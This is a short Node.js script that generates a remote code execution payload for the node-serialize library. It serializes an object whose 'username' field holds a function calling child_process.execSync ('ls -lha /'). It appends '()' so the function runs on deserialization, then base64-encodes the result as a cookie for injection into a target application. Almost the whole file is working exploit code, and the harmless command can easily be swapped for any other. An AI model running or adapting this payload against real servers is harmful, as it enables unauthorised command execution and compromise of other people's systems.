const command = 'ls -lha /'

const payload = {
    'csrftoken': 'u32t4o3tb3gg431fs34ggdgchjwnza0l=',
    'Expires=': 'Tuesday, 13 Oct 2020 00: 00: 00 GMT',
    'username': function () {
        return require('child_process').execSync(command).toString();
    }
};

const serialize = require('node-serialize');

let res = serialize.serialize(payload);

res = res.slice(0, -2) + '()' + res.slice(-2); // to make it call itself

console.log('Result\n');
// serialize.unserialize(res);
console.log('Serialized: ' + res);
console.log('Cookie: ' + encodeURIComponent(Buffer.from(res).toString('base64')));